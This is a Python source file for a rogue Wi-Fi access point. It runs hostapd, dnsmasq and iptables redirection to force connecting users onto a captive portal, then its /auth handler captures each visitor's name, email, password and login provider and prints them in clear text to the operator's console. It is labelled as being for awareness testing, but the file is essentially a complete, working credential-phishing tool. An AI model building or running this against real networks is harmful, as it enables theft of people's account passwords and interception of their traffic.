#!/usr/bin/env python3
"""
Rogue AP Module with Clean Captive Portal Success & High Stability
Created a simple open Wi-Fi access point for awareness testing.
"""

import os
import time
import subprocess
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse
from rich.console import Console
from rich.table import Table
from rich import box  # <-- CORRETTO: importiamo direttamente il modulo box

console = Console()

# Global set to track authorized client IPs after clicking the portal
AUTHORIZED_CLIENTS = set()
# Set to track clients that have seen the portal
PORTAL_SHOWN = set()


class CaptivePortalHandler(BaseHTTPRequestHandler):
    """HTTP Server to handle captive portal landing page and release traffic"""
    
    # Dictionary to save user data
    user_data = {}

    def _authorize_client(self, client_ip):
        """Authorize the client in iptables rules"""
        try:
            # Remove existing rules for this IP
            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-D', 'PREROUTING', '-s', client_ip, '-p', 'tcp', '--dport', '80', '-j', 'ACCEPT'], capture_output=True)
            subprocess.run(['sudo', 'iptables', '-D', 'FORWARD', '-s', client_ip, '-j', 'ACCEPT'], capture_output=True)
            
            # Add new rules
            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-I', 'PREROUTING', '1', '-s', client_ip, '-p', 'tcp', '--dport', '80', '-j', 'ACCEPT'], capture_output=True)
            subprocess.run(['sudo', 'iptables', '-I', 'FORWARD', '1', '-s', client_ip, '-j', 'ACCEPT'], capture_output=True)
            return True
        except Exception:
            return False

    def _is_apple_device(self, user_agent, path):
        """Check if the request is from an Apple device"""
        is_apple = any([
            'CaptiveNetworkSupport' in user_agent,
            'Apple' in user_agent and 'CFNetwork' in user_agent,
            'iPhone' in user_agent or 'iPad' in user_agent,
            'Mac OS' in user_agent and 'Captive' in user_agent,
            'watchOS' in user_agent,
            'AppleTV' in user_agent,
        ])
        
        apple_endpoints = [
            '/hotspot-detect.html',
            '/library/test/success.html', 
            '/generate_204',
            '/success',
            '/ncsi.txt',
            '/connecttest.txt',
            '/gen_204',
            '/canonical.html',
            '/captive.html',
            '/index.html'
        ]
        
        is_apple_endpoint = path in apple_endpoints
        return is_apple or is_apple_endpoint

    def _send_success_response(self):
        """Send a complete success response that Apple recognizes"""
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
        self.send_header('Pragma', 'no-cache')
        self.send_header('Expires', '0')
        self.send_header('Connection', 'close')
        self.end_headers()
        
        return """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>Success</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: #f4f6f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 6px 20px rgba(0,0,0,0.1);
            max-width: 400px;
        }
        .success-icon { font-size: 64px; margin-bottom: 20px; }
        h2 { color: #2ecc71; margin-bottom: 10px; }
        p { color: #666; margin: 10px 0; }
        .close-btn {
            background: #3498db;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
        }
        .close-btn:hover { background: #2980b9; }
        .countdown { color: #999; font-size: 14px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="success-icon">✅</div>
        <h2>Connessione Completata!</h2>
        <p>Ora sei connesso alla rete. Puoi chiudere questa finestra.</p>
        <button class="close-btn" onclick="closeWindow()">Chiudi</button>
        <div class="countdown">Chiusura automatica tra <span id="countdown">3</span> secondi</div>
    </div>
    <script>
        function closeWindow() {
            try { window.close(); } catch(e) {}
            if (window.webkit && window.webkit.messageHandlers) {
                window.webkit.messageHandlers.captivePortal.postMessage('success');
            }
            if (window.chrome && window.chrome.webview) {
                window.chrome.webview.postMessage('success');
            }
            if (window.external && window.external.Notify) {
                window.external.Notify('success');
            }
        }
        let seconds = 3;
        const countdownEl = document.getElementById('countdown');
        const timer = setInterval(function() {
            seconds--;
            if (countdownEl) countdownEl.textContent = seconds;
            if (seconds <= 0) {
                clearInterval(timer);
                closeWindow();
            }
        }, 1000);
        setTimeout(function() { try { window.close(); } catch(e) {} }, 500);
        setTimeout(function() {
            if (!window.closed) {
                window.location.href = 'http://captive.apple.com/hotspot-detect.html';
            }
        }, 3000);
    </script>
</body>
</html>"""

    def do_HEAD(self):
        """Handle HEAD requests"""
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()

    def do_GET(self):
        parsed_path = urlparse(self.path)
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', '')

        # Se il client è GIÀ autorizzato, mandalo alla schermata di successo
        if client_ip in AUTHORIZED_CLIENTS:
            response = self._send_success_response()
            self.wfile.write(response.encode('utf-8'))
            return

        # Handle authentication endpoint (/auth)
        if parsed_path.path == "/auth":
            query_params = {}
            if parsed_path.query:
                for param in parsed_path.query.split('&'):
                    if '=' in param:
                        key, value = param.split('=', 1)
                        query_params[key] = value
            
            if client_ip not in self.user_data:
                self.user_data[client_ip] = {}
            
            if query_params:
                self.user_data[client_ip].update({
                    'name': query_params.get('name', 'Utente'),
                    'email': query_params.get('email', 'Non specificata'),
                    'password': query_params.get('password', 'Non specificata'),
                    'provider': query_params.get('provider', 'email'),
                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                })
            
            user_info = self.user_data.get(client_ip, {})
            
            console.print("\n" + "="*70)
            console.print("[bold green]📥 NEW ACCESS DETECTED![/bold green]")
            console.print("="*70)
            
            # CORRETTO: Uso di box.ROUNDED anziché Table.box.ROUNDED
            info_table = Table(title="User Data", box=box.ROUNDED, title_style="bold cyan")
            info_table.add_column("Field", style="bold yellow", width=15)
            info_table.add_column("Value", style="green", width=40)
            
            info_table.add_row("🌐 Client IP", client_ip)
            info_table.add_row("👤 Name", user_info.get('name', 'Not specified'))
            info_table.add_row("📧 Email", user_info.get('email', 'Not specified'))
            info_table.add_row("🔑 Password", user_info.get('password', 'Not specified'))
            
            provider = user_info.get('provider', 'email')
            provider_icon = "🔵 Google" if provider == 'google' else "📧 Email"
            info_table.add_row("🔑 Provider", provider_icon)
            info_table.add_row("🕐 Time", user_info.get('timestamp', 'N/A'))
            
            console.print(info_table)
            console.print(f"[dim]📊 Total registrations: [bold]{len(self.user_data)}[/bold][/dim]")
            console.print("="*70 + "\n")
            
            if client_ip not in AUTHORIZED_CLIENTS:
                AUTHORIZED_CLIENTS.add(client_ip)
                self._authorize_client(client_ip)
            
            response = self._send_success_response()
            self.wfile.write(response.encode('utf-8'))
            return
        
        # Handle favicon requests
        if parsed_path.path == "/favicon.ico":
            self.send_response(204)
            self.end_headers()
            return
        
        # PER QUALSIASI ALTRA RICHIESTA: Mostriamo sempre il portale se non autorizzato
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
        self.send_header('Pragma', 'no-cache')
        self.send_header('Expires', '0')
        self.end_headers()

        script_dir = os.path.dirname(os.path.abspath(__file__))
        portal_path = os.path.join(script_dir, 'portal.html')

        try:
            with open(portal_path, 'rb') as f:
                portal_html = f.read()
            self.wfile.write(portal_html)
        except FileNotFoundError:
            self.wfile.write(b"<h1>Errore: file portal.html non trovato nella cartella dello script.</h1>")

    def log_message(self, format, *args):
        return


class RogueAP:

    def __init__(self):
        self.interface = None
        self.inet_interface = None
        self.hostapd_process = None
        self.dnsmasq_process = None
        self.http_server = None
        self.http_thread = None
        self.hostapd_conf = "/tmp/rogue_hostapd.conf"
        self.dnsmasq_conf = "/tmp/rogue_dnsmasq.conf"
        self.dnsmasq_leases = "/tmp/rogue_dnsmasq.leases"
        self.ap_ip = "10.0.0.1"

    def check_dependencies(self):
        tools = ['hostapd', 'dnsmasq', 'iptables']
        missing = [t for t in tools if os.system(f"which {t} > /dev/null 2>&1") != 0]
        return missing

    def get_internet_interface(self):
        try:
            res = subprocess.run(['ip', 'route', 'show', 'default'], capture_output=True, text=True, check=True)
            parts = res.stdout.split()
            if 'dev' in parts:
                return parts[parts.index('dev') + 1]
        except Exception:
            pass
        return None

    def _write_hostapd_conf(self, interface, essid, channel):
        conf = f"""interface={interface}
driver=nl80211
ssid={essid}
hw_mode=g
channel={channel}
auth_algs=1
wmm_enabled=0
ieee80211n=1
ht_capab=[SHORT-GI-20][DSSS_CCK-40]
beacon_int=100
dtim_period=2
"""
        with open(self.hostapd_conf, 'w') as f:
            f.write(conf)

    def _write_dnsmasq_conf(self, interface):
        conf = f"""interface={interface}
listen-address={self.ap_ip}
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,{self.ap_ip}
dhcp-option=6,{self.ap_ip}
server=8.8.8.8
server=1.1.1.1
dhcp-leasefile={self.dnsmasq_leases}
bind-interfaces
"""
        with open(self.dnsmasq_conf, 'w') as f:
            f.write(conf)

    def start_http_server(self):
        try:
            self.http_server = HTTPServer((self.ap_ip, 80), CaptivePortalHandler)
            self.http_thread = threading.Thread(target=self.http_server.serve_forever, daemon=True)
            self.http_thread.start()
        except Exception as e:
            console.print(f"[yellow][!] Could not start HTTP portal server on port 80: {e}[/yellow]")

    def force_cleanup(self, interface):
        subprocess.run(['sudo', 'killall', 'hostapd', 'dnsmasq'], capture_output=True)
        subprocess.run(['sudo', 'pkill', '-f', 'rogue_hostapd'], capture_output=True)
        subprocess.run(['sudo', 'pkill', '-f', 'rogue_dnsmasq'], capture_output=True)
        
        if interface:
            subprocess.run(['sudo', 'nmcli', 'device', 'set', interface, 'managed', 'yes'], capture_output=True)
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], capture_output=True)
            subprocess.run(['sudo', 'iwconfig', interface, 'mode', 'managed'], capture_output=True)
            subprocess.run(['sudo', 'ip', 'addr', 'flush', 'dev', interface], capture_output=True)
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], capture_output=True)

        try:
            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-F'], capture_output=True)
            subprocess.run(['sudo', 'iptables', '-F', 'FORWARD'], capture_output=True)
        except Exception:
            pass

    def start(self, interface, essid, channel=6, inet_interface=None):
        console.print(f"\n[bold cyan][*] Starting Rogue AP '{essid}' on {interface} (channel {channel})...[/bold cyan]")

        self.force_cleanup(interface)
        subprocess.run(['sudo', 'systemctl', 'stop', 'systemd-resolved'], capture_output=True)

        missing = self.check_dependencies()
        if missing:
            console.print(f"[red][✗] Missing dependencies: {', '.join(missing)}[/red]")
            console.print("[yellow]Install with: sudo apt install hostapd dnsmasq iptables[/yellow]")
            return False

        self.interface = interface
        self.inet_interface = inet_interface or self.get_internet_interface()

        if not self.inet_interface:
            console.print("[red][✗] Could not detect internet-facing interface. Pass it manually or check connection.[/red]")
            return False

        console.print(f"[dim][*] Internet passthrough interface detected: {self.inet_interface}[/dim]")

        try:
            subprocess.run(['sudo', 'nmcli', 'device', 'set', interface, 'managed', 'no'], capture_output=True)
            subprocess.run(['sudo', 'iw', 'dev', interface, 'set', 'power_save', 'off'], capture_output=True)
            subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=1'], capture_output=True, check=True)

            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', self.inet_interface, '-j', 'MASQUERADE'], capture_output=True, check=True)
            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', self.interface, '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', f'{self.ap_ip}:80'], capture_output=True, check=True)
            subprocess.run(['sudo', 'iptables', '-A', 'FORWARD', '-i', self.interface, '-o', self.inet_interface, '-j', 'DROP'], capture_output=True, check=True)
            subprocess.run(['sudo', 'iptables', '-A', 'FORWARD', '-i', self.inet_interface, '-o', self.interface, '-m', 'state', '--state', 'RELATED,ESTABLISHED', '-j', 'ACCEPT'], capture_output=True, check=True)

            subprocess.run(['sudo', 'ip', 'addr', 'add', f'{self.ap_ip}/24', 'dev', interface], capture_output=True, timeout=5)

            self._write_hostapd_conf(interface, essid, channel)
            self._write_dnsmasq_conf(interface)

            console.print("[dim]Starting hostapd...[/dim]")
            self.hostapd_process = subprocess.Popen(
                ['sudo', 'hostapd', self.hostapd_conf],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )
            time.sleep(2.5)

            if self.hostapd_process.poll() is not None:
                console.print("[red][✗] hostapd failed to start — check that the interface supports AP mode[/red]")
                self.stop()
                return False

            console.print("[dim]Starting dnsmasq (DHCP + DNS Upstream)...[/dim]")
            self.dnsmasq_process = subprocess.Popen(
                ['sudo', 'dnsmasq', '-C', self.dnsmasq_conf, '--no-daemon'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.PIPE,
                stdin=subprocess.DEVNULL,
                text=True
            )
            time.sleep(1.5)

            console.print("[dim]Starting Captive Portal Web Server on port 80...[/dim]")
            self.start_http_server()

            console.print(f"[bold green][✓] Rogue AP '{essid}' is up on {interface} ({self.ap_ip}) with High Stability & Captive Portal active![/bold green]")
            console.print("[bold yellow]📊 Waiting for connections... User data will be displayed here![/bold yellow]")
            return True

        except Exception as e:
            console.print(f"[red][✗] Error starting Rogue AP: {e}[/red]")
            self.stop()
            return False

    def stop(self):
        console.print("\n[cyan][*] Stopping Rogue AP and restoring network...[/cyan]")

        if self.http_server:
            try:
                self.http_server.shutdown()
                self.http_server.server_close()
            except Exception:
                pass

        for proc in [self.hostapd_process, self.dnsmasq_process]:
            if proc and proc.poll() is None:
                try:
                    proc.terminate()
                    proc.wait(timeout=2)
                except Exception:
                    proc.kill()

        if self.interface:
            self.force_cleanup(self.interface)

        for f in [self.hostapd_conf, self.dnsmasq_conf, self.dnsmasq_leases]:
            try:
                os.remove(f)
            except Exception:
                pass

        AUTHORIZED_CLIENTS.clear()
        self.hostapd_process = None
        self.dnsmasq_process = None
        self.http_server = None

        console.print("[green][✓] Rogue AP stopped cleanly, hardware interface reset[/green]")